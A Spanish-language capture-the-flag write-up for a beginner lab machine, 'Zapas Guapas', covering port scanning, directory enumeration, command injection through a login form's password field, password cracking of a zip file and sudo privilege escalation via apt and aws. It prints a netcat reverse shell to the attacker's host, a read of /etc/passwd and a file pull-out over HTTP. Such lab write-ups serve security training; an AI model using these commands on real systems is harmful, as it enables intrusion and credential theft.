---
description: '🔍 Dificultad: Principiante'
---

# Zapas Guapas

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.70
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.70
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.70
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos la página de una tienda de zapatillas.

<figure><img src="../../.gitbook/assets/image (709).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://192.168.1.68
```



Vemos que hay un archivo `login.html` que revisaremos.

<figure><img src="../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>

Probando varias opciones me he dado cuenta que hay una ejecución remota de comandos por lo que a poner cualquier usuario y añadir en el campo contraseña el comando:

```bash
cat /etc/passwd
```

Nos damos cuenta de 3 usuarios **root**, **pronike** y **proadidas**. Voy a realizar una Reverse Shell.

```bash
busybox nc 192.168.1.50 443 -e sh
```

Tras ponerme en escucha y realizar tratamiento de la TTY. Como se nos muestra aquí: [Tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/). Indagando en el usuario **pronike** encontramos un archivo `nota.txt`.

<figure><img src="../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

También encontramos en el directorio `/opt` un zip que nos descargamos a nuestra máquina local.

```
En la máquina víctima
python3 -m http.server 8080
En la máquina atacante
wget http://192.168.1.70:8080/importante.zip
```

<figure><img src="../../.gitbook/assets/image (712).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Ahora realizamos fuerza bruta.

```bash
zip2john importante.zip > hash_zip
```

```bash
john hash_zip --wordlist=/usr/share/wordlists/rockyou.txt 
```

<figure><img src="../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

Obtenemos la contraseña para descomprimir el **.zip**.

<figure><img src="../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

```bash
ssh pronike@192.168.1.70
```

<figure><img src="../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos sudo en **apt**. Para más detalles, visitamos [GTFObins - apt](https://gtfobins.github.io/gtfobins/apt/).

<figure><img src="../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

Repetimos el proceso, por lo que hacemos:

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos sudo en **aws**. Para más detalles, visitamos [GTFObins - AWS](https://gtfobins.github.io/gtfobins/aws/)

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
